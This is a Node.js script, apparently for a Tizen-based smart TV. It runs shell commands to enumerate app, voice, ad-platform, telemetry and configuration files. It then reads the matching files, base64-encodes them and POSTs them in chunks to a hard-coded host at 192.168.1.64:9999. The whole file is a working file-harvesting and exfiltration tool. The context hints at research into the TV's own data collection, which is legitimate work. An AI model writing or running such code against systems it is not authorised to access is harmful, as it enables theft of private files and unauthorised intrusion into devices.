"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body, cb) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) {
            res.resume();
            console.log("posted " + path + " -> " + res.statusCode);
            if (cb) cb(null);
        });
    req.on("error", function (e) {
        console.log("post error " + path + " " + e.message);
        if (cb) cb(e);
    });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 60000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var inv = {};
inv.started = new Date().toISOString();
inv.id = sh("id");
inv.caps = sh("grep Cap /proc/self/status");
inv.safsearch_models = sh("ls -la /opt/usr/apps/voltapps/3201701011465/panel_22.07130/safSearch/models/ 2>&1 | head -80");
inv.safsearch_all = sh("find /opt/usr/apps/voltapps/3201701011465/panel_22.07130 -type f \\( -name '*.js' -o -name '*.json' -o -name '*.xml' -o -name '*.html' \\) -size -2M 2>/dev/null | head -400");
inv.voltapps_js = sh("find /opt/usr/apps/voltapps -type f -name '*.js' -size -2M 2>/dev/null | wc -l; find /opt/usr/apps/voltapps -type f -name '*.js' -size -2M 2>/dev/null | head -400");
inv.privacy_names = sh("find /opt/usr /opt/etc /opt/var /home/owner/share /etc -type f \\( -iname '*watch*' -o -iname '*collect*' -o -iname '*telemetry*' -o -iname '*privacy*' -o -iname '*agree*' -o -iname '*consent*' -o -iname '*recommend*' -o -iname '*usage*' -o -iname '*track*' -o -iname '*adplatform*' -o -iname '*disclaimer*' -o -iname '*eula*' \\) -size -2M 2>/dev/null | head -200");
inv.voice = sh("find /home/owner/share/.voice /opt/usr/apps/voice* /opt/usr/apps/*voice* -type f -size -512k 2>/dev/null | head -100");
inv.adplatform = sh("find /opt/usr/apps/adplatform /opt/usr/apps/*ad* -type f \\( -name '*.js' -o -name '*.json' -o -name '*.xml' -o -name '*.conf' -o -name '*.cfg' -o -name '*.txt' \\) -size -512k 2>/dev/null | head -100");
inv.context_aware = sh("find /opt/usr/apps/context-aware-service /opt/usr/apps/org.tizen.homedatacontrol-service /opt/usr/apps/register-device /opt/usr/apps/empNSFAgent -type f -size -512k 2>/dev/null | head -150");
inv.etc_conf = sh("find /opt/etc /etc -maxdepth 2 -type f \\( -name '*.conf' -o -name '*.cfg' -o -name '*.json' -o -name '*.xml' -o -name '*.ini' \\) -size -256k 2>/dev/null | head -120");

var wantRe = /(watch|collect|telemetry|privacy|agree|consent|recommend|usage|track|ad|disclaimer|eula|log|nudge|promo|personal|profil|history|stat|sync|cloud|push)/i;

var candidates = [];
var seen = {};
function addPath(p) {
    p = p.trim();
    if (!p || seen[p]) return;
    seen[p] = 1;
    try {
        var st = fs.statSync(p);
        if (!st.isFile() || st.size > 700000) return;
        candidates.push({ path: p, size: st.size });
    } catch (e) {}
}

var walkLists = [inv.safsearch_models, inv.safsearch_all, inv.privacy_names, inv.voice, inv.adplatform, inv.context_aware, inv.etc_conf];
for (var w = 0; w < walkLists.length; w++) {
    var lines = walkLists[w].split("\n");
    for (var i = 0; i < lines.length; i++) {
        var ln = lines[i].trim();
        if (ln.indexOf("/") === 0) addPath(ln);
        else {
            var m = ln.match(/(\/\S+)$/);
            if (m) addPath(m[1]);
        }
    }
}

var pri = [];
var rest = [];
for (var c = 0; c < candidates.length; c++) {
    var name = candidates[c].path.split("/").pop();
    if (/mntWatchDataCollection\.js$/i.test(name) || /safSearch\/models\//.test(candidates[c].path) || wantRe.test(name)) pri.push(candidates[c]);
    else rest.push(candidates[c]);
}
var order = pri.concat(rest);
var total = 0;
var MAXTOTAL = 11000000;
var files = [];
for (var o = 0; o < order.length; o++) {
    if (total + order[o].size > MAXTOTAL) continue;
    try {
        var buf = fs.readFileSync(order[o].path);
        files.push({ path: order[o].path, size: order[o].size, b64: buf.toString("base64") });
        total += order[o].size;
    } catch (e) {
        files.push({ path: order[o].path, size: order[o].size, err: String(e.message || e) });
    }
}
inv.candidate_count = candidates.length;
inv.pulled_count = files.length;
inv.pulled_bytes = total;

post("/codeinv", inv);

var chunks = [];
var cur = [];
var curLen = 0;
for (var f = 0; f < files.length; f++) {
    var fl = files[f];
    var sz = fl.b64 ? fl.b64.length : 100;
    if (curLen + sz > 700000 && cur.length) { chunks.push(cur); cur = []; curLen = 0; }
    cur.push(fl);
    curLen += sz;
}
if (cur.length) chunks.push(cur);

var idx = 0;
function next() {
    if (idx >= chunks.length) {
        post("/code_done", { started: inv.started, files: files.length, bytes: total, chunks: chunks.length });
        return;
    }
    var n = idx;
    idx++;
    post("/codepull_" + n, { started: inv.started, chunk: n, of: chunks.length, files: chunks[n] }, function () { next(); });
}
next();
